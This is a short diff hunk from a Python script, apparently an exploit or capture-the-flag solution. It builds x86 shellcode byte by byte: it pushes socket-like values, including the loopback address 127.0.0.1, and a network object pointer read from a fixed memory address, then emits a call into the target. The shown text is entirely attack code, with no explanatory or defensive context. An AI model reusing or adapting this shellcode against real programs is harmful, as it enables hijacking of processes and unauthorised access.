@@ -61,7 +61,7 @@ def main() -> int:
     for value in (0, 28969, 0x0100007F, 4, 0, 0):
         code += b"\x68" + struct.pack("<I", value)
     code += b"\x68" + struct.pack("<I", obj)  # [ebp+0xC]
-    code += b"\x68" + struct.pack("<I", 0)    # [ebp+8]
+    code += b"\x68" + struct.pack("<I", u32(h, 0x8269774))    # [ebp+8] = netobj
     call_pos = len(code)
     code += b"\xe8\x00\x00\x00\x00"
     code += b"\x81\xc4\x20\x00\x00\x00"
